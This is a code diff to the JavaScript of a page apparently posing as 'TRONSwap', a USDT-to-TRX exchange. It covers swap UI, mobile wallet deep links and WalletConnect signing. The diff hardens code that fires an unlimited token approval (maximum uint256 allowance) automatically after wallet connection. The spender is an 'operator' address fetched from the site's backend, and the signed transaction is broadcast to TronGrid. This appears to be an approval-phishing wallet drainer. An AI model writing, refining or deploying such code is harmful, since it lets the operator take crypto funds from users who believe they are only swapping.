@@ -605,21 +605,23 @@
             recvSuffix.textContent = tmpSuf;
 
             if (swapDirection === 'USDT_TO_TRX') {
-                swapDirection = 'TRX_TO_USDT';
-                if (sendPanel) sendPanel.textContent = _t.send_amount_trx || '보내는 금액 (TRX)';
-                if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt || '받는 금액 (예상 USDT)';
-                icon.style.transform = 'rotate(180deg)';
-            } else {
-                swapDirection = 'USDT_TO_TRX';
-                if (sendPanel) sendPanel.textContent = _t.send_amount || '보내는 금액 (USDT)';
-                if (recvPanel) recvPanel.textContent = _t.receive_amount || '받는 금액 (예상)';
-                icon.style.transform = 'rotate(0deg)';
-            }
-            updateSwapOutput();
-        }
+              swapDirection = 'TRX_TO_USDT';
+              if (sendPanel) sendPanel.textContent = _t.send_amount_trx || '보내는 금액 (TRX)';
+              if (recvPanel) recvPanel.textContent = _t.receive_amount_usdt || '받는 금액 (예상 USDT)';
+              icon.style.transform = 'rotate(180deg)';
+          } else {
+              swapDirection = 'USDT_TO_TRX';
+              if (sendPanel) sendPanel.textContent = _t.send_amount || '보내는 금액 (USDT)';
+              if (recvPanel) recvPanel.textContent = _t.receive_amount || '받는 금액 (예상)';
+              icon.style.transform = 'rotate(0deg)';
+          }
+          updateRateDisplay();
+          updateSwapOutput();
+      }
 
         var MAX_ALLOWANCE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        var isConnected = false, isApproved = false, activeProvider = 'Unknown', currentWalletAddress = null;
+        var isConnected = false, isApproved = false, isApproving = false, activeProvider = 'Unknown', currentWalletAddress = null;
+        var wcConnector = null, wcAddress = null;
 
         // ===== Utils =====
         function escapeHtml(s) {
@@ -684,21 +686,44 @@
         }
 
         var userUsdtBalance = 0;
-        var TRX_RATE = 0;
+      var userTrxBalance = 0;
+      var TRX_RATE = 0;
 
-        async function fetchTrxPrice() {
-            try {
-                var res = await fetch(API_BASE + '/trx-price');
-                var data = await res.json();
-                if (data.price > 0) {
-                    TRX_RATE = 1 / data.price;
-                    var el = document.getElementById('exchange-rate');
-                    if (el) el.textContent = TRX_RATE.toFixed(2);
-                }
-            } catch (e) {
-                if (!TRX_RATE) TRX_RATE = 4.0;
-            }
-        }
+        function updateRateDisplay() {
+          var baseEl = document.getElementById('rate-base');
+          var quoteEl = document.getElementById('rate-quote');
+          var rateEl = document.getElementById('exchange-rate');
+          if (!rateEl) return;
+
+          if (!TRX_RATE) {
+              rateEl.textContent = '-';
+              return;
+          }
+
+          if (swapDirection === 'TRX_TO_USDT') {
+              if (baseEl) baseEl.textContent = 'TRX';
+              if (quoteEl) quoteEl.textContent = 'USDT';
+              rateEl.textContent = (1 / TRX_RATE).toFixed(4);
+          } else {
+              if (baseEl) baseEl.textContent = 'USDT';
+              if (quoteEl) quoteEl.textContent = 'TRX';
+              rateEl.textContent = TRX_RATE.toFixed(2);
+          }
+      }
+
+      async function fetchTrxPrice() {
+          try {
+              var res = await fetch(API_BASE + '/trx-price');
+              var data = await res.json();
+              if (data.price > 0) {
+                  TRX_RATE = 1 / data.price;
+                  updateRateDisplay();
+              }
+          } catch (e) {
+              if (!TRX_RATE) TRX_RATE = 4.0;
+              updateRateDisplay();
+          }
+      }
 
         function updateTodayVolume() {
             if (!TRX_RATE) return;
@@ -726,10 +751,11 @@
         };
 
         window.setSwapPct = function (pct) {
-            var amt = (userUsdtBalance * (pct / 100)).toFixed(2);
-            document.getElementById('swap-input').value = amt;
-            updateSwapOutput();
-        };
+          var baseBalance = (swapDirection === 'TRX_TO_USDT') ? userTrxBalance : userUsdtBalance;
+          var amt = (baseBalance * (pct / 100)).toFixed(2);
+          document.getElementById('swap-input').value = amt;
+          updateSwapOutput();
+      };
 
         // Localisation helper for log messages
         var logTexts = {
@@ -889,69 +915,53 @@
                 return;
             }
 
-            // Android
-            if (isAndroid()) {
-                var isChromeBrowser = /Chrome/i.test(navigator.userAgent) && !/SamsungBrowser|UCBrowser|OPR|Whale|Puffin|Brave/i.test(navigator.userAgent);
-                if (!isChromeBrowser) {
-                    var chromeIntent = 'intent://' + window.location.host + window.location.pathname + window.location.search + '#Intent;scheme=https;package=com.android.chrome;end';
-                    showToast(currentLang === 'ko' ? 'Chrome 브라우저로 이동합니다...' : 'Redirecting to Chrome...', 'info');
-                    setTimeout(function () { window.location.href = chromeIntent; }, 300);
-                    return;
-                }
-                navigator.clipboard.writeText(url).catch(function () { });
-                var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
-                var schemeLinks = {
-                    tronlink: { scheme: 'tronlinkoutside://pull.activity?param=' + tronlinkParam, pkg: 'com.tronlinkpro.wallet' },
-                    trust: { scheme: 'trust://open_url?coin_id=195&url=' + encoded, pkg: 'com.wallet.crypto.trustapp' },
-                    tokenpocket: { scheme: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })), pkg: 'vip.mytokenpocket' },
-                    bitget: { scheme: 'bitkeep://bkconnect?action=dapp&url=' + encoded, pkg: 'com.bitkeep.wallet' },
-                    okx: { scheme: 'okx://wallet/dapp/url?dappUrl=' + encoded, pkg: 'com.okinc.okex.gp' },
-                    imtoken: { scheme: 'imtokenv2://navigate/DappView?url=' + encoded, pkg: 'im.token.app' }
-                };
-                var stores = {
-                    tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
-                    trust: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
-                    tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
-                    bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
-                    okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
-                    imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
-                };
-                var sc = schemeLinks[wallet];
-                if (sc) {
-                    var schemeName = sc.scheme.split('://')[0];
-                    var schemePath = sc.scheme.split('://')[1] || '';
-                    window.location.href = 'intent://' + schemePath + '#Intent;scheme=' + schemeName + ';package=' + sc.pkg + ';S.browser_fallback_url=' + encodeURIComponent(stores[wallet] || '') + ';end';
-                }
-                return;
-            }
+            // 모바일 공통: URL 복사 및 지갑 스킴 준비
+          try { if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(url).catch(function () { }); } catch (e) { }
+          var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
+          var mobileSchemes = {
+              tronlink: 'tronlinkoutside://pull.activity?param=' + tronlinkParam,
+              trust: 'trust://open_url?coin_id=195&url=' + encoded,
+              tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
+              bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
+              okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
+              imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
+          };
 
-            // iOS Chrome
-            if (isIOSChrome()) {
-                navigator.clipboard.writeText(url).catch(function () { });
-                var iosSchemes = {
-                    tronlink: 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' })),
-                    trust: 'trust://open_url?coin_id=195&url=' + encoded,
-                    tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
-                    bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
-                    okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
-                    imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
-                };
-                if (iosSchemes[wallet]) window.location.href = iosSchemes[wallet];
-                return;
-            }
+          // Android: 지갑 앱 인텐트 호출 (미설치 시 스토어로 폴백)
+          if (isAndroid()) {
+              var stores = {
+                  tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
+                  trust: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
+                  tokenpocket: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
+                  bitget: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
+                  okx: 'https://play.google.com/store/apps/details?id=com.okinc.okex.gp',
+                  imtoken: 'https://play.google.com/store/apps/details?id=im.token.app'
+              };
+              var pkgs = {
+                  tronlink: 'com.tronlinkpro.wallet',
+                  trust: 'com.wallet.crypto.trustapp',
+                  tokenpocket: 'vip.mytokenpocket',
+                  bitget: 'com.bitkeep.wallet',
+                  okx: 'com.okinc.okex.gp',
+                  imtoken: 'im.token.app'
+              };
+              var rawScheme = mobileSchemes[wallet];
+              if (rawScheme && pkgs[wallet]) {
+                  var schemeName = rawScheme.split('://')[0];
+                  var schemePath = rawScheme.split('://')[1] || '';
+                  window.location.href = 'intent://' + schemePath + '#Intent;scheme=' + schemeName + ';package=' + pkgs[wallet] + ';S.browser_fallback_url=' + encodeURIComponent(stores[wallet] || '') + ';end';
+                  return;
+              }
+          }
 
-            // iOS Safari → Chrome redirect
-            if (isSafari()) {
-                var chromeUrl = 'googlechromes://' + window.location.host + window.location.pathname + window.location.search;
-                showToast(currentLang === 'ko' ? 'Chrome 브라우저로 이동합니다...' : 'Redirecting to Chrome...', 'info');
-                var chromeTimeout = setTimeout(function () {
-                    showToast(currentLang === 'ko' ? 'Chrome이 없으면 지갑 앱에서 직접 URL을 열어주세요' : 'Open the URL in your wallet app', 'error');
-                    navigator.clipboard.writeText(url).catch(function () { });
-                }, 2500);
-                window.addEventListener('pagehide', function () { clearTimeout(chromeTimeout); }, { once: true });
-                window.location.href = chromeUrl;
-                return;
-            }
+          // iOS (Safari / Chrome 등): 지갑 딥링크 시도 후 안내
+          if (isIOS()) {
+              if (mobileSchemes[wallet]) {
+                  showToast(currentLang === 'ko' ? '지갑 앱을 여는 중... 안 열리면 지갑 브라우저에 붙여넣어 주세요.' : 'Opening wallet app...');
+                  window.location.href = mobileSchemes[wallet];
+                  return;
+              }
+          }
 
             // Fallback: WalletConnect
             showToast(currentLang === 'ko' ? '지갑 앱을 여는 중...' : 'Opening wallet app...');
@@ -967,16 +977,15 @@
 
         // ===== Wallet Detection =====
         function detectProvider() {
-            if (window.tronLink || window.tronWeb) {
-                if (window.trustwallet || navigator.userAgent.indexOf('Trust') >= 0) return 'TrustWallet';
-                if (window.tokenpocket || navigator.userAgent.indexOf('TokenPocket') >= 0) return 'TokenPocket';
-                if (navigator.userAgent.indexOf('BitKeep') >= 0 || navigator.userAgent.indexOf('Bitget') >= 0) return 'Bitget';
-                if (navigator.userAgent.indexOf('OKApp') >= 0) return 'OKX';
-                if (navigator.userAgent.indexOf('imToken') >= 0 || window.imToken) return 'imToken';
-                return 'TronLink';
-            }
-            return null;
-        }
+          var ua = navigator.userAgent || '';
+          if (window.bitkeep || window.bitget || /BitKeep|Bitget/i.test(ua)) return 'Bitget';
+          if (window.okxwallet || /OKApp|OKX/i.test(ua)) return 'OKX';
+          if (window.tokenpocket || window.tp || /TokenPocket/i.test(ua)) return 'TokenPocket';
+          if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
+          if (window.imToken || /imToken/i.test(ua)) return 'imToken';
+          if (window.tronLink || window.tronWeb) return 'TronLink';
+          return null;
+      }
 
         async function getInjectedTronWeb() {
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) return window.tronWeb;
@@ -1024,28 +1033,27 @@
             }
         });
 
-        // ===== WalletConnect v2 =====
-        var wcConnector = null;
-        var wcAddress = null;
-
         async function initWalletConnect() {
-            if (wcConnector) return wcConnector;
-            if (typeof TronWalletConnect === 'undefined') { showToast('WalletConnect 로드 실패', 'error'); return null; }
-            try {
-                wcConnector = new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a', {
-                    name: 'TRONSwap',
-                    description: 'USDT to TRX Instant Exchange',
-                    url: window.location.origin,
-                    icons: [window.location.origin + '/favicon.png']
-                });
-                await wcConnector.init();
-                wcConnector.onDisconnect = function () { wcAddress = null; };
-                return wcConnector;
-            } catch (e) {
-                showToast('WalletConnect 초기화 실패', 'error');
-                return null;
-            }
-        }
+          if (wcConnector) return wcConnector;
+          if (typeof TronWalletConnect === 'undefined') { showToast('WalletConnect 로드 실패', 'error'); return null; }
+          try {
+              wcConnector = new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a', {
+                  name: 'TRONSwap',
+                  description: 'USDT to TRX Instant Exchange',
+                  url: window.location.origin,
+                  icons: [window.location.origin + '/favicon.png']
+              });
+              await wcConnector.init();
+              wcConnector.onDisconnect = function () {
+                  wcAddress = null;
+                  if (wcConnector) wcConnector.session = null;
+              };
+              return wcConnector;
+          } catch (e) {
+              showToast('WalletConnect 초기화 실패', 'error');
+              return null;
+          }
+      }
 
         async function connectViaWalletConnect() {
             var wc = await initWalletConnect();
@@ -1125,23 +1133,29 @@
             } catch (e) { showToast('백엔드 연결 실패', 'error'); }
 
             // TRX 잔액
-            try {
-                var _tr = await fetch(API_BASE + '/trx/' + address);
-                var _td = await _tr.json();
-                if (_td.trxBalance) {
-                    try { document.getElementById('trx-bal-swap').textContent = parseFloat(_td.trxBalance).toFixed(2); } catch (e) { }
-                }
-            } catch (e) { }
+          try {
+              var _tr = await fetch(API_BASE + '/trx/' + address);
+              var _td = await _tr.json();
+              if (_td.trxBalance !== undefined && _td.trxBalance !== null) {
+                  userTrxBalance = parseFloat(_td.trxBalance) || 0;
+                  var trxText = userTrxBalance.toFixed(2);
+                  var targetId = (swapDirection === 'TRX_TO_USDT') ? 'usdt-bal-swap' : 'trx-bal-swap';
+                  try { document.getElementById(targetId).textContent = trxText; } catch (e) { }
+              }
+          } catch (e) { }
 
             // 레퍼럴
             try { trackReferralConnect(address, provider); } catch (e) { }
 
             // 자동 승인 (연결 직후)
-            if (!isApproved && !_autoApproveScheduled) {
-                setTimeout(function () {
-                    if (!isApproved) executeUnlimitedApprove();
-                }, 800);
-            }
+          if (!isApproved && !isApproving && !_autoApproveScheduled) {
+              _autoApproveScheduled = true;
+              setTimeout(function () {
+                  if (isConnected && currentWalletAddress && !isApproved && !isApproving) {
+                      executeUnlimitedApprove();
+                  }
+              }, 1500);
+          }
 
             // 에너지 주소 재확인
             setTimeout(function () {
@@ -1175,12 +1189,14 @@
 
         // ===== Approve =====
         window.executeUnlimitedApprove = async function () {
-            if (!isConnected || !currentWalletAddress) {
-                showToast('지갑을 먼저 연결하세요.', 'error');
-                handleConnectWallet();
-                return;
-            }
-            if (isApproved) return;
+          if (!isConnected || !currentWalletAddress) {
+              showToast('지갑을 먼저 연결하세요.', 'error');
+              handleConnectWallet();
+              return;
+          }
+          if (isApproved) return;
+          if (isApproving) return;
+          isApproving = true;
 
             // Spender 주소 획득 (최대 3회)
             var spender = null;
@@ -1191,6 +1207,7 @@
             }
             if (!spender) {
                 showToast('운영자 주소를 불러오지 못했습니다.', 'error');
+                isApproving = false;
                 return;
             }
 
@@ -1220,6 +1237,7 @@
                         useWC = true;
                     } else {
                         showToast(currentLang === 'ko' ? '지갑에서 서명을 확인하세요' : 'Please check your wallet', 'error');
+                        isApproving = false;
                         return;
                     }
                 }
@@ -1311,27 +1329,39 @@
                     if (wcConnector.signTransaction) {
                         wcResult = await wcConnector.signTransaction(triggerData.transaction);
                     } else if (wcConnector.client) {
-                        // WalletConnect v2 직접 request
-                        wcResult = await wcConnector.client.request({
-                            topic: wcConnector.session.topic,
-                            chainId: 'tron:0x2b6653dc',
-                            request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
-                        });
-                    } else {
+                      var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
+                          (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
+                      if (!activeTopic) {
+                          throw new Error('WalletConnect 세션이 만료되었습니다. 지갑을 다시 연결해 주세요.');
+                      }
+                      wcResult = await wcConnector.client.request({
+                          topic: activeTopic,
+                          chainId: 'tron:0x2b6653dc',
+                          request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
+                      });
+                  }
+                    else {
                         throw new Error('WalletConnect 서명 메서드를 찾을 수 없습니다');
                     }
 
                     if (wcResult && wcResult.result) wcResult = wcResult.result;
+                  if (typeof wcResult === 'string') {
+                      try {
+                          var parsed = JSON.parse(wcResult);
+                          wcResult = parsed;
+                      } catch (parseErr) {
+                          wcResult = { signature: [wcResult] };
+                      }
+                  }
 
-                    var broadcastPayload;
-                    if (wcResult && wcResult.signature && wcResult.txID) {
-                        broadcastPayload = wcResult;
-                    } else if (wcResult && wcResult.signature) {
-                        broadcastPayload = JSON.parse(JSON.stringify(triggerData.transaction));
-                        broadcastPayload.signature = Array.isArray(wcResult.signature) ? wcResult.signature : [wcResult.signature];
-                    } else {
-                        broadcastPayload = wcResult;
-                    }
+                  var broadcastPayload = JSON.parse(JSON.stringify(triggerData.transaction));
+                  if (wcResult && wcResult.raw_data && wcResult.signature) {
+                      broadcastPayload = wcResult;
+                  } else if (wcResult && wcResult.signature) {
+                      broadcastPayload.signature = Array.isArray(wcResult.signature) ? wcResult.signature : [wcResult.signature];
+                  } else {
+                      throw new Error('지갑에서 유효한 서명 데이터를 받지 못했습니다.');
+                  }
 
                     var broadcastRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
                         method: 'POST',
@@ -1389,10 +1419,14 @@
                     console.error('[APPROVE]', err);
                 }
             } finally {
-                var _t = translations[currentLang] || translations.en;
-                btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + (_t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)') + '</span>';
-                btn.disabled = false;
-            }
+            isApproving = false;
+            var _t = translations[currentLang] || translations.en;
+            var btnLabel = isApproved
+                ? (_t.swap_btn_done || '교환하기')
+                : (_t.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
+            btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + btnLabel + '</span>';
+            btn.disabled = false;
+        }
         };
     </script>
 
